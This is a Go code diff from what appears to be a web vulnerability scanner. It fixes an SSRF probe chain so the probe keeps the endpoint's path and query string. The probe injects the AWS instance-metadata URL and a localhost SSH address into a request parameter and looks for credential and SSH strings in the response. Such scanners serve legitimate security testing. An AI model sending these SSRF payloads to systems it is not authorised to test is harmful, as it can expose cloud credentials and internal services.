@@ -242,20 +242,29 @@ func ChainSSRFProbe(client *http.Client, cfg *core.Config, baseURL string, param
 		return nil
 	}
 	chain := NewChain("SSRFProbe")
-	chain.Vars["base"] = fmt.Sprintf("%s://%s", parsed.Scheme, parsed.Host)
-	chain.Vars["param"] = param
+	// Keep the original path and merge with any existing query string so the
+	// probe actually hits the endpoint under test instead of the site root.
+	base := fmt.Sprintf("%s://%s%s", parsed.Scheme, parsed.Host, parsed.EscapedPath())
+	sep := "?"
+	if parsed.RawQuery != "" {
+		sep = "&"
+	}
+	payloadVal := url.QueryEscape("http://169.254.169.254/latest/meta-data/")
+	chain.Vars["base"] = base
+	chain.Vars["awsq"] = sep + url.QueryEscape(param) + "=" + payloadVal
+	chain.Vars["localq"] = sep + url.QueryEscape(param) + "=" + url.QueryEscape("http://127.0.0.1:22/")
 
 	chain.AddStep(ChainStep{
 		Name:       "probe_aws",
 		Method:     "GET",
-		URL:        "{{base}}?{{param}}=http://169.254.169.254/latest/meta-data/",
+		URL:        "{{base}}{{awsq}}",
 		MatchWords: []string{"ami-id", "instance-id", "security-credentials"},
 		OnFail:     []string{"probe_localhost"},
 	})
 	chain.AddStep(ChainStep{
 		Name:       "probe_localhost",
 		Method:     "GET",
-		URL:        "{{base}}?{{param}}=http://127.0.0.1:22/",
+		URL:        "{{base}}{{localq}}",
 		MatchWords: []string{"SSH", "OpenSSH", "protocol mismatch"},
 	})
 	return chain.Run(client, cfg, "probe_aws")
